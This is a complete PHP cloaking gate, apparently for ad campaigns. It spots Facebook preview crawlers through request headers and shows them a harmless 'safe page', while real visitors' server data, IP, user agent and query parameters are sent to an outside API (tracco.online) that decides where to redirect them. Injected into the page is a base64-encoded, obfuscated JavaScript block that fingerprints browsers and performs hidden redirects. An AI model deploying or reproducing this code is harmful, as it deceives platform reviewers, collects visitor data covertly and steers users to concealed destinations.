<?php
ini_set('display_errors', '0');
error_reporting(0);
date_default_timezone_set('UTC');

define('TI_TIME', time());
define('TI_FLOW', 'B1lDGkB56B');
define('TI_API', 'https://tracco.online/api/ti/v1/gate');
define('TI_SAFE', 'index2.php');
define('TI_UTM', 'true');

if (!function_exists('getallheaders')) {
    function getallheaders()
    {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) === 'HTTP_') {
                $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
            }
        }
        return $headers;
    }
}

new TraccoGate();

class TraccoGate
{
    public function __construct()
    {
        try {
            if (!function_exists('curl_version')) {
                throw new Exception('php-curl required');
            }

            $headers = array_change_key_case(getallheaders());
            if (
                (isset($headers['x-purpose']) && $headers['x-purpose'] === 'preview')
                || (isset($headers['x-fb-http-engine']) && $headers['x-fb-http-engine'] === 'liger')
                || isset($headers['tracco-curl'])
            ) {
                $this->safePage();
            }

            if (isset($_POST['hdata'])) {
                $extended = $_POST['hdata'];
                if (is_string($extended)) {
                    $decoded = json_decode($extended, true);
                    if (is_array($decoded)) {
                        $decoded['server'] = [
                            'REMOTE_ADDR' => $_SERVER['REMOTE_ADDR'] ?? '',
                            'HTTP_USER_AGENT' => $_SERVER['HTTP_USER_AGENT'] ?? '',
                            'HTTP_REFERER' => $_SERVER['HTTP_REFERER'] ?? '',
                        ];
                        $decoded['query'] = $_GET;
                        $extended = json_encode($decoded);
                    }
                }
                $this->responser(
                    $this->utmTransfer(
                        json_decode($this->curlSender('extended', $extended), true)
                    )
                );
            }

            new TraccoRedirect(
                $this->utmTransfer(
                    json_decode($this->curlSender('basic', $this->dataCollector()), true)
                )
            );

            header('Referrer-Policy: no-referrer');
            echo $this->injectReferrerPolicy($this->appendAssets(TraccoHtml::get()));
        } catch (Exception $e) {
            $this->safePage();
        }
    }

    private function safePage()
    {
        if (is_file(TI_SAFE)) {
            include TI_SAFE;
            exit;
        }
        header('Location: ' . TI_SAFE, true, 302);
        exit;
    }

    private function utmTransfer($response)
    {
        if (!is_array($response)) {
            return ['status' => 'block', 'link' => TI_SAFE];
        }
        if (($response['status'] ?? '') === 'ok' && !empty($_GET) && TI_UTM === 'true' && !empty($response['link'])) {
            $parsed = parse_url($response['link']);
            $start = empty($parsed['query']) ? '?' : '&';
            $response['link'] = $response['link'] . $start . http_build_query($_GET);
        }
        return $response;
    }

    private function dataCollector()
    {
        $_SERVER['time'] = TI_TIME;
        $_SERVER['flow_hash'] = TI_FLOW;
        array_walk_recursive($_SERVER, function (&$parameter) {
            $parameter = htmlspecialchars((string) $parameter, ENT_QUOTES, 'UTF-8');
        });
        return json_encode([
            'campaign' => TI_FLOW,
            'flow_hash' => TI_FLOW,
            'query' => $_GET,
            'server' => $_SERVER,
        ]);
    }

    private function injectReferrerPolicy($html)
    {
        if (stripos($html, 'name="referrer"') !== false) {
            return $html;
        }
        $tag = '<meta name="referrer" content="no-referrer">';
        if (preg_match('/<head([^>]*)>/i', $html)) {
            return preg_replace('/<head([^>]*)>/i', '<head$1>' . "\n" . $tag, $html, 1);
        }
        return $tag . $html;
    }

    private function appendAssets($html)
    {
        if (!preg_match('/<body([^>]*)>/i', $html, $bodyString)) {
            throw new Exception('missing body tag');
        }
        $bodyTag = '<body' . $bodyString[1] . '>';
        return str_replace($bodyTag, $bodyTag . PHP_EOL . $this->assets(), $html);
    }

    private function curlSender($type, $data)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
        curl_setopt($ch, CURLOPT_URL, TI_API . '?type=' . urlencode($type));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'data=' . urlencode($data));
        curl_setopt($ch, CURLOPT_TIMEOUT, 12);
        $response = curl_exec($ch);
        if ($response === false) {
            $err = curl_error($ch);
            curl_close($ch);
            throw new Exception('curl: ' . $err);
        }
        curl_close($ch);
        return $response;
    }

    private function responser($response)
    {
        if (!is_array($response)) {
            $response = ['status' => 'block', 'link' => TI_SAFE];
        }
        header('Content-Type: application/json; charset=utf-8');
        exit(json_encode($response));
    }

    private function assets()
    {
        return '<script>' . base64_decode('ZnVuY3Rpb24gXzB4MTljOCgpe3ZhciBfMHg0MThlYmE9Wyd5MmYweTJHJywnQzNyWUF3NU5Bd3o1JywndE5ia0EwZScsJ0QzalBEZ3UnLCdBdzVLenhIcHpHJywnbmRpWW90eTF6dVBKQTJ2TycsJ3FKZlNyZURScUp1MnFHJywnQzJ2SENNbk8nLCdBZ3ZQejJIMCcsJ0VORFVFeG0nLCdBTm5WQkcnLCdCZ0xVQVcnLCdtTGI0emVUbXRHJywndWZyWkR4ZScsJ0MyWFB5MnUnLCdpSjQ4RGdMMEJndSt2MnZTeTI5VHp0V1ZEZ0wwQmd1K3BjOU96d2ZLcEpYSUIycjVwSlhVQjNuSkNNTFdEZDQ4eXNiWXp3VzlpTTVWQ012TXp4all6eGlHQk05VkNndlV6eGlJaWdIWXp3eTlpRycsJ3pNOVlyd2ZKQWEnLCdtdGpWenVMS3ozdScsJ3kyWFZDMnUnLCdETUxaQXhyVkNLTEsnLCdqTmYxQjNxNycsJ3d2SHd3TnEnLCd5MkRpQ00wJywnQjNiTEJHJywnQjI1MEIzdkpBaG4weXhqMCcsJ0NNdlpCMlgyendycENoclBCMjVaJywnQzNuZndnMCcsJ3d1ZjB6TWknLCdyZ2YwenZyUEJ3dmdCM2pUeXhxJywnbnRxV29kR1h1ZmoydEtuMycsJ0NnZjBBZzVIQnd1JywndUsxcnd1aScsJ210YVhudHFYcTI1eHFNcm8nLCd0dmpKdHUwJywnRGdMVHp2UFZCTXUnLCdwY2ZLQjJuMEV4YkxpZ0gwQndXK3BnSDBCd1crcGdITHl3cStwZzFMRGdlR3kySEhDTm5MRGQwSUR4ck1sdEdJcEpYVHp4ckhpZzVIQnd1OWlOakx6TXZZQ012WWlJYkpCMjUwenc1MHBzalVCWTFZend6TENOakxDSWkrcGcxTERnZUdCTWZUenQwSUNNOUlCM3JaaUliSkIyNTB6dzUwcHNqVUIyTFV6Z3Y0bGc1VnpNOVNCZzkzbGc1Vnl4akpBZ0wyenNpK3BnMUxEZ2VHQWhyMENjMUxDeHZQREowSUNNdk1DTXZaQWNpR3kyOVVEZ3ZVRGQwSW1kVDFDTVc5JywnQWhyMENobTZsWTlWQ2d2VXpOYkp6ZzRVQXc4VnpNTFV6MnZZQ2hqUEJOclFDWTkybnEnLCdDMkhwdmZtJywnQWdqakFNTycsJ21KR1htZzFudmd2SkNXJywnRDJMS0RnRycsJ0Foakx6RycsJ3l4YldCZ0xKeXhyUEIyNFZFYzEzRDNDVHpNOVlCczExQ01YTEJNblZ6Z3ZLJywnak1EMG9XJywnQ05ESEVNbScsJ2lKNXBDZ3ZVcGM5SHBKV1ZCTTlaeTNqUENocStwYzlJQjJyNXBKV1ZBaHJUQmQ0Jywnak1YMG9XJywnQ012V0JnZkp6cScsJ0F3NUt6eEdZbE5iT0NhJywnbVppWW9kdkp5M2ZkcTJtJywncXhiZ3oxdScsJ21oV1hGZHY4bmhXNUZkRDhvaFcyRmRlV0ZkbjhtRycsJ25aajNDM1AzdjBXJywnQzJ2MCcsJ0MyZlR6czFWQ01MTkF3NCcsJ0MzckhEaHZaJywnQ012TXp4all6eGknLCd1MUxaekxDJywnbVpDWG9kcTN1aExqc2VESicsJ25KYTNudENZQjA1eHMwSHInLCdES1B6QTNPJywnbXRtMW9kbVhuTExIc2hmakRxJywnQzNiU0F4cScsJ3oydjAnLCd1ZTl0dmEnLCdEZ0hMQkcnXTtfMHgxOWM4PWZ1bmN0aW9uKCl7cmV0dXJuIF8weDQxOGViYTt9O3JldHVybiBfMHgxOWM4KCk7fWZ1bmN0aW9uIF8weDkwMTgoXzB4Mzc5NzkxLF8weDVjZTVhZSl7XzB4Mzc5NzkxPV8weDM3OTc5MS0weDEwYzt2YXIgXzB4MTljOGI4PV8weDE5YzgoKTt2YXIgXzB4OTAxODQ5PV8weDE5YzhiOFtfMHgzNzk3OTFdO2lmKF8weDkwMThbJ29za0luZiddPT09dW5kZWZpbmVkKXt2YXIgXzB4OTdlZDgzPWZ1bmN0aW9uKF8weDQ5NmY5MCl7dmFyIF8weDI5YzUwNz0nYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWjAxMjM0NTY3ODkrLz0nO3ZhciBfMHg0NGFjZjE9JycsXzB4ODE0MzI0PScnO2Zvcih2YXIgXzB4MzgyMDRhPTB4MCxfMHg1OTM1OWYsXzB4MTg2OGY0LF8weDI3MGIwND0weDA7XzB4MTg2OGY0PV8weDQ5NmY5MFsnY2hhckF0J10oXzB4MjcwYjA0KyspO35fMHgxODY4ZjQmJihfMHg1OTM1OWY9XzB4MzgyMDRhJTB4ND9fMHg1OTM1OWYqMHg0MCtfMHgxODY4ZjQ6XzB4MTg2OGY0LF8weDM4MjA0YSsrJTB4NCk/XzB4NDRhY2YxKz1TdHJpbmdbJ2Zyb21DaGFyQ29kZSddKDB4ZmYmXzB4NTkzNTlmPj4oLTB4MipfMHgzODIwNGEmMHg2KSk6MHgwKXtfMHgxODY4ZjQ9XzB4MjljNTA3WydpbmRleE9mJ10oXzB4MTg2OGY0KTt9Zm9yKHZhciBfMHg1MDE3ZTI9MHgwLF8weDFkODJlNz1fMHg0NGFjZjFbJ2xlbmd0aCddO18weDUwMTdlMjxfMHgxZDgyZTc7XzB4NTAxN2UyKyspe18weDgxNDMyNCs9JyUnKygnMDAnK18weDQ0YWNmMVsnY2hhckNvZGVBdCddKF8weDUwMTdlMilbJ3RvU3RyaW5nJ10oMHgxMCkpWydzbGljZSddKC0weDIpO31yZXR1cm4gZGVjb2RlVVJJQ29tcG9uZW50KF8weDgxNDMyNCk7fTtfMHg5MDE4WydzZHpTRGEnXT1fMHg5N2VkODMsXzB4OTAxOFsnZUJYSmtOJ109e30sXzB4OTAxOFsnb3NrSW5mJ109ISFbXTt9dmFyIF8weDJiYmJjOT1fMHgxOWM4YjhbMHgwXSxfMHg0NmZlMDU9XzB4Mzc5NzkxK18weDJiYmJjOSxfMHgxN2EzZDE9XzB4OTAxOFsnZUJYSmtOJ11bXzB4NDZmZTA1XTtyZXR1cm4hXzB4MTdhM2QxPyhfMHg5MDE4NDk9XzB4OTAxOFsnc2R6U0RhJ10oXzB4OTAxODQ5KSxfMHg5MDE4WydlQlhKa04nXVtfMHg0NmZlMDVdPV8weDkwMTg0OSk6XzB4OTAxODQ5PV8weDE3YTNkMSxfMHg5MDE4NDk7fShmdW5jdGlvbihfMHgzZTRiYWQsXzB4MzljZDc0KXt2YXIgXzB4NTMyYjA4PV8weDkwMTgsXzB4MmM4OTNiPV8weDNlNGJhZCgpO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4NDhmMjQ5PXBhcnNlSW50KF8weDUzMmIwOCgweDEyNikpLzB4MSooLXBhcnNlSW50KF8weDUzMmIwOCgweDExNSkpLzB4MikrLXBhcnNlSW50KF8weDUzMmIwOCgweDEyOSkpLzB4MystcGFyc2VJbnQoXzB4NTMyYjA4KDB4MTQ2KSkvMHg0Ky1wYXJzZUludChfMHg1MzJiMDgoMHgxMGUpKS8weDUqKHBhcnNlSW50KF8weDUzMmIwOCgweDExYSkpLzB4NikrcGFyc2VJbnQoXzB4NTMyYjA4KDB4MTQzKSkvMHg3KihwYXJzZUludChfMHg1MzJiMDgoMHgxM2QpKS8weDgpK3BhcnNlSW50KF8weDUzMmIwOCgweDE0NCkpLzB4OStwYXJzZUludChfMHg1MzJiMDgoMHgxMzApKS8weGEqKHBhcnNlSW50KF8weDUzMmIwOCgweDEzYSkpLzB4Yik7aWYoXzB4NDhmMjQ5PT09XzB4MzljZDc0KWJyZWFrO2Vsc2UgXzB4MmM4OTNiWydwdXNoJ10oXzB4MmM4OTNiWydzaGlmdCddKCkpO31jYXRjaChfMHg0MjI3MTcpe18weDJjODkzYlsncHVzaCddKF8weDJjODkzYlsnc2hpZnQnXSgpKTt9fX0oXzB4MTljOCwweDQ2MDc3KSwoZnVuY3Rpb24oKXt2YXIgXzB4NWU4ZTJjPV8weDkwMTgsXzB4MWZlMGUxPXsnUk1RWUInOmZ1bmN0aW9uKF8weDMxYmViYSxfMHgzNWZjNmQpe3JldHVybiBfMHgzMWJlYmEoXzB4MzVmYzZkKTt9LCdIb0lYSSc6JyZhbXA7JywnUFRzdXEnOl8weDVlOGUyYygweDExZCksJ3FZbXpkJzpfMHg1ZThlMmMoMHgxMzcpLCd2Sllreic6XzB4NWU4ZTJjKDB4MTM0KSwnendueXMnOmZ1bmN0aW9uKF8weDJlYWYwNyxfMHg1YjExNjEpe3JldHVybiBfMHgyZWFmMDcrXzB4NWIxMTYxO30sJ1lYVlp0JzpfMHg1ZThlMmMoMHgxMTgpLCdBcEZnVSc6ZnVuY3Rpb24oXzB4MmU5NjU5LF8weDU3MjhlZCl7cmV0dXJuIF8weDJlOTY1OT09PV8weDU3MjhlZDt9LCdoVktpVyc6ZnVuY3Rpb24oXzB4MzJjYTRmLF8weGQ4ZWIxMCl7cmV0dXJuIF8weDMyY2E0ZiE9PV8weGQ4ZWIxMDt9LCdzc0VYbSc6ZnVuY3Rpb24oXzB4NGRjNDUxLF8weDgwNTQ0YSxfMHg1ZWY5OWMpe3JldHVybiBfMHg0ZGM0NTEoXzB4ODA1NDRhLF8weDVlZjk5Yyk7fSwnU1lzZlcnOl8weDVlOGUyYygweDEzMyksJ2NnSHJtJzpmdW5jdGlvbihfMHg1N2ZlMTEsXzB4NDJiZmFhKXtyZXR1cm4gXzB4NTdmZTExfHxfMHg0MmJmYWE7fSwnTVJjTU0nOmZ1bmN0aW9uKF8weDRhY2I1NixfMHg3NjU1MmYpe3JldHVybiBfMHg0YWNiNTYoXzB4NzY1NTJmKTt9LCdoYklqaic6ZnVuY3Rpb24oXzB4Mzk0Zjc3LF8weDIyM2RkYil7cmV0dXJuIF8weDM5NGY3NyBpbiBfMHgyMjNkZGI7fSwnWUF0ZmInOmZ1bmN0aW9uKF8weDEyZjIyNCxfMHgyNjAzNzIpe3JldHVybiBfMHgxMmYyMjQrXzB4MjYwMzcyO30sJ05wSmtBJzpmdW5jdGlvbihfMHgyNmJmNDUsXzB4NTM5ZTk2KXtyZXR1cm4gXzB4MjZiZjQ1KF8weDUzOWU5Nik7fSwncndhemMnOl8weDVlOGUyYygweDEyZCl9LF8weDMzZjU0Yz1fMHg1ZThlMmMoMHgxMGYpLF8weDFjOGZiOD1fMHg1ZThlMmMoMHgxMzkpO2Z1bmN0aW9uIF8weDE5ZTkwYShfMHgzMWYzNmMpe3ZhciBfMHhmYjdiNjc9XzB4NWU4ZTJjO3JldHVybiBfMHgxZmUwZTFbXzB4ZmI3YjY3KDB4MTI4KV0oU3RyaW5nLF8weDMxZjM2YylbXzB4ZmI3YjY3KDB4MTM4KV0oLyYvZyxfMHgxZmUwZTFbJ0hvSVhJJ10pWydyZXBsYWNlJ10oLyIvZyxfMHgxZmUwZTFbXzB4ZmI3YjY3KDB4MTE2KV0pWydyZXBsYWNlJ10oLzwvZyxfMHgxZmUwZTFbJ3FZbXpkJ10pW18weGZiN2I2NygweDEzOCldKC8+L2csXzB4MWZlMGUxW18weGZiN2I2NygweDE0NSldKTt9ZnVuY3Rpb24gXzB4NGVlZDI1KF8weDIzMTk3OSl7dmFyIF8weDVmMjg1Nj1fMHg1ZThlMmMsXzB4NTRlZWUzPV8weDE5ZTkwYShfMHgyMzE5NzkpO3RyeXtkb2N1bWVudFtfMHg1ZjI4NTYoMHgxMjApXSgpLGRvY3VtZW50W18weDVmMjg1NigweDEwYyldKF8weDFmZTBlMVtfMHg1ZjI4NTYoMHgxMTIpXShfMHg1ZjI4NTYoMHgxMmMpK18weDU0ZWVlMytfMHgxZmUwZTFbXzB4NWYyODU2KDB4MTFlKV0sXzB4NTRlZWUzKStfMHg1ZjI4NTYoMHgxMzYpKSxkb2N1bWVudFtfMHg1ZjI4NTYoMHgxMWIpXSgpO31jYXRjaChfMHg0YWE3NDEpe3RyeXtsb2NhdGlvbltfMHg1ZjI4NTYoMHgxMzgpXShfMHgyMzE5NzkpO31jYXRjaChfMHg1ZDY5MTMpe2xvY2F0aW9uW18weDVmMjg1NigweDEzMildPV8weDIzMTk3OTt9fX1mdW5jdGlvbiBfMHg0MDE4Y2EoKXt2YXIgXzB4Mjc5NjZlPV8weDVlOGUyYzt0cnl7dmFyIF8weGQxNWM3Mj1sb2NhdGlvbltfMHgyNzk2NmUoMHgxMTApXXx8Jyc7bG9jYXRpb25bXzB4Mjc5NjZlKDB4MTM4KV0oXzB4ZDE1YzcyJiZfMHgxZmUwZTFbXzB4Mjc5NjZlKDB4MTNiKV0oXzB4MWM4ZmI4W18weDI3OTY2ZSgweDEwZCldKCc/JyksLTB4MSk/XzB4MWM4ZmI4K18weGQxNWM3MjpfMHhkMTVjNzImJl8weDFmZTBlMVsnaFZLaVcnXShfMHgxYzhmYjhbXzB4Mjc5NjZlKDB4MTBkKV0oJz8nKSwtMHgxKT9fMHgxZmUwZTFbXzB4Mjc5NjZlKDB4MTEyKV0oXzB4MWZlMGUxW18weDI3OTY2ZSgweDExMildKF8weDFjOGZiOCwnJicpLF8weGQxNWM3MltfMHgyNzk2NmUoMHgxMTcpXSgweDEpKTpfMHgxYzhmYjgpO31jYXRjaChfMHg1N2ZhOGYpe2xvY2F0aW9uW18weDI3OTY2ZSgweDEzOCldKF8weDFjOGZiOCk7fX1mdW5jdGlvbiBfMHg5NjdiZmYoXzB4MjVlMjgzKXt2YXIgXzB4NGIyODNkPV8weDVlOGUyYyxfMHg1MTQ4YjU9XzB4NGIyODNkKDB4MTNjKVsnc3BsaXQnXSgnfCcpLF8weDNkOTVjOT0weDA7d2hpbGUoISFbXSl7c3dpdGNoKF8weDUxNDhiNVtfMHgzZDk1YzkrK10pe2Nhc2UnMCc6dmFyIF8weDQ4ZjQzOT17J3NoT1RTJzpmdW5jdGlvbihfMHg5ZmZjNWQsXzB4NTg2MTJjKXtyZXR1cm4gXzB4OWZmYzVkPT09XzB4NTg2MTJjO319O2NvbnRpbnVlO2Nhc2UnMSc6dmFyIF8weDRhYTY0YT0nJyxfMHg1MDRiNjY9JycsXzB4NWEzYWU0PScnLF8weDQ4ZGQ4ZD0hW10sXzB4MjNhOGE3PTB4MDtjb250aW51ZTtjYXNlJzInOl8weDFmZTBlMVtfMHg0YjI4M2QoMHgxMjMpXShmZXRjaCxsb2NhdGlvbltfMHg0YjI4M2QoMHgxMjcpXStsb2NhdGlvbltfMHg0YjI4M2QoMHgxMTApXSx7J21ldGhvZCc6XzB4NGIyODNkKDB4MTQ5KSwnaGVhZGVycyc6eydDb250ZW50LVR5cGUnOl8weDFmZTBlMVtfMHg0YjI4M2QoMHgxNDIpXX0sJ2JvZHknOl8weDMzNjRkNVsndG9TdHJpbmcnXSgpLCdjcmVkZW50aWFscyc6XzB4NGIyODNkKDB4MTNmKX0pWyd0aGVuJ10oZnVuY3Rpb24oXzB4MTdiNzY5KXt2YXIgXzB4MWZkMmE4PV8weDRiMjgzZDtyZXR1cm4gXzB4MTdiNzY5W18weDFmZDJhOCgweDExMyldKCk7fSlbXzB4NGIyODNkKDB4MTRhKV0oZnVuY3Rpb24oXzB4MTM3YWM3KXt2YXIgXzB4NTlmOTA5PV8weDRiMjgzZDtpZihfMHgxMzdhYzcmJl8weDQ4ZjQzOVtfMHg1OWY5MDkoMHgxMmUpXShfMHgxMzdhYzdbXzB4NTlmOTA5KDB4MTQwKV0sJ29rJykmJl8weDEzN2FjN1tfMHg1OWY5MDkoMHgxMTQpXSl7XzB4NGVlZDI1KF8weDEzN2FjN1tfMHg1OWY5MDkoMHgxMTQpXSk7cmV0dXJuO31fMHg0MDE4Y2EoKTt9KVtfMHg0YjI4M2QoMHgxNGIpXShfMHg0MDE4Y2EpO2NvbnRpbnVlO2Nhc2UnMyc6XzB4MzM2NGQ1W18weDRiMjgzZCgweDEzZSldKCdoZGF0YScsSlNPTltfMHg0YjI4M2QoMHgxNGMpXSh7J2Zsb3cnOl8weDMzZjU0YywndmlzaXRvcklkJzpfMHgxZmUwZTFbXzB4NGIyODNkKDB4MTFmKV0oXzB4MjVlMjgzLCcnKSwndGltZXpvbmUnOl8weDRhYTY0YSwnbGFuZ3VhZ2UnOl8weDUwNGI2Niwnc2NyZWVuUmVzb2x1dGlvbic6XzB4NWEzYWU0LCd0b3VjaENhcGFibGUnOl8weDQ4ZGQ4ZCwnbWF4VG91Y2hQb2ludHMnOl8weDIzYThhNywncGFnZVVybCc6bG9jYXRpb25bXzB4NGIyODNkKDB4MTMyKV0sJ3JlZmVycmVyJzpkb2N1bWVudFtfMHg0YjI4M2QoMHgxNDEpXXx8JycsJ3F1ZXJ5JzpfMHgyZWNkMGF9KSk7Y29udGludWU7Y2FzZSc0Jzp0cnl7XzB4NTA0YjY2PW5hdmlnYXRvclsnbGFuZ3VhZ2UnXXx8Jyc7fWNhdGNoKF8weDExYTY0YSl7fWNvbnRpbnVlO2Nhc2UnNSc6dHJ5e18weDRhYTY0YT1JbnRsW18weDRiMjgzZCgweDEyNSldKClbXzB4NGIyODNkKDB4MTIyKV0oKVtfMHg0YjI4M2QoMHgxMmIpXXx8Jyc7fWNhdGNoKF8weGY1NTBkYyl7fWNvbnRpbnVlO2Nhc2UnNic6dHJ5e2xvY2F0aW9uW18weDRiMjgzZCgweDExMCldW18weDRiMjgzZCgweDExNyldKDB4MSlbJ3NwbGl0J10oJyYnKVtfMHg0YjI4M2QoMHgxMTkpXShmdW5jdGlvbihfMHg1MTllNWYpe3ZhciBfMHgxZDFlZjk9XzB4NGIyODNkLF8weDFjZjZmOT1fMHg1MTllNWZbXzB4MWQxZWY5KDB4MTQ3KV0oJz0nKTtpZihfMHgxY2Y2ZjlbMHgwXSlfMHgyZWNkMGFbXzB4MWZlMGUxW18weDFkMWVmOSgweDEyOCldKGRlY29kZVVSSUNvbXBvbmVudCxfMHgxY2Y2ZjlbMHgwXSldPV8weDFmZTBlMVsnUk1RWUInXShkZWNvZGVVUklDb21wb25lbnQsXzB4MWNmNmY5WzB4MV18fCcnKTt9KTt9Y2F0Y2goXzB4Mjg0Y2U0KXt9Y29udGludWU7Y2FzZSc3Jzp0cnl7XzB4MjNhOGE3PV8weDFmZTBlMVtfMHg0YjI4M2QoMHgxMmEpXShOdW1iZXIsbmF2aWdhdG9yWydtYXhUb3VjaFBvaW50cyddKXx8MHgwLF8weDQ4ZGQ4ZD1fMHgyM2E4YTc+MHgwfHxfMHgxZmUwZTFbXzB4NGIyODNkKDB4MTJmKV0oXzB4NGIyODNkKDB4MTIxKSx3aW5kb3cpO31jYXRjaChfMHgyNGIzMTcpe31jb250aW51ZTtjYXNlJzgnOnZhciBfMHgyZWNkMGE9e307Y29udGludWU7Y2FzZSc5Jzp0cnl7aWYoc2NyZWVuKV8weDVhM2FlND1fMHgxZmUwZTFbXzB4NGIyODNkKDB4MTI0KV0oc2NyZWVuW18weDRiMjgzZCgweDEzMSldLCd4Jykrc2NyZWVuW18weDRiMjgzZCgweDExMSldO31jYXRjaChfMHgxZjE3OGMpe31jb250aW51ZTtjYXNlJzEwJzp2YXIgXzB4MzM2NGQ1PW5ldyBVUkxTZWFyY2hQYXJhbXMoKTtjb250aW51ZTt9YnJlYWs7fX10cnl7aW1wb3J0KF8weDFmZTBlMVtfMHg1ZThlMmMoMHgxMzUpXSlbJ3RoZW4nXShmdW5jdGlvbihfMHgzMzhmYzMpe3JldHVybiBfMHgzMzhmYzNbJ2xvYWQnXSgpO30pW18weDVlOGUyYygweDE0YSldKGZ1bmN0aW9uKF8weDNkNjdkOSl7dmFyIF8weDI0YjhiOT1fMHg1ZThlMmM7cmV0dXJuIF8weDNkNjdkOVtfMHgyNGI4YjkoMHgxNDgpXSgpO30pW18weDVlOGUyYygweDE0YSldKGZ1bmN0aW9uKF8weDVmNTQ4Yyl7dmFyIF8weDJkZjc3MD1fMHg1ZThlMmM7XzB4MWZlMGUxW18weDJkZjc3MCgweDE0ZCldKF8weDk2N2JmZixfMHg1ZjU0OGNbXzB4MmRmNzcwKDB4MTFjKV18fCcnKTt9KVtfMHg1ZThlMmMoMHgxNGIpXShmdW5jdGlvbigpe18weDk2N2JmZignJyk7fSk7fWNhdGNoKF8weDRhZWViNSl7XzB4OTY3YmZmKCcnKTt9fSgpKSk7') . '</script>';
    }
}

class TraccoHtml
{
    public static function get()
    {
        if (!file_exists(TI_SAFE)) {
            throw new Exception('Safe page missing: ' . TI_SAFE);
        }
        $content = file_get_contents(TI_SAFE);
        if (!preg_match('/<body([^>]*)>/i', $content) || preg_match('/<\?php/i', $content)) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $url = $scheme . '://' . ($_SERVER['HTTP_HOST'] ?? 'localhost') . ($_SERVER['REQUEST_URI'] ?? '/');
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, ['TRACCO-CURL: true']);
            $html = curl_exec($ch);
            curl_close($ch);
            if (!$html) {
                throw new Exception('failed to load safe page');
            }
            return $html;
        }
        return $content;
    }
}

class TraccoRedirect
{
    public function __construct($response)
    {
        if (is_array($response) && ($response['status'] ?? '') === 'ok' && !empty($response['link'])) {
            self::noReferrerRedirect($response['link']);
        }
    }

    public static function noReferrerRedirect($url)
    {
        $u = htmlspecialchars((string) $url, ENT_QUOTES, 'UTF-8');
        header('Referrer-Policy: no-referrer');
        header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
        header('Pragma: no-cache');
        header('Content-Type: text/html; charset=utf-8');
        echo '<!doctype html><html lang="en"><head><meta charset="utf-8">'
            . '<meta name="referrer" content="no-referrer">'
            . '<meta name="robots" content="noindex,nofollow,noarchive">'
            . '<meta http-equiv="refresh" content="0;url=' . $u . '">'
            . '<title>Welcome</title>'
            . '<style>html,body{background:#fafafa;color:#444;font-family:system-ui,sans-serif;margin:0;padding:0;height:100%;display:flex;align-items:center;justify-content:center}</style>'
            . '</head><body>'
            . '<noscript><a style="color:#444;text-decoration:underline" rel="noreferrer noopener" href="' . $u . '">Open</a></noscript>'
            . '</body></html>';
        exit;
    }
}
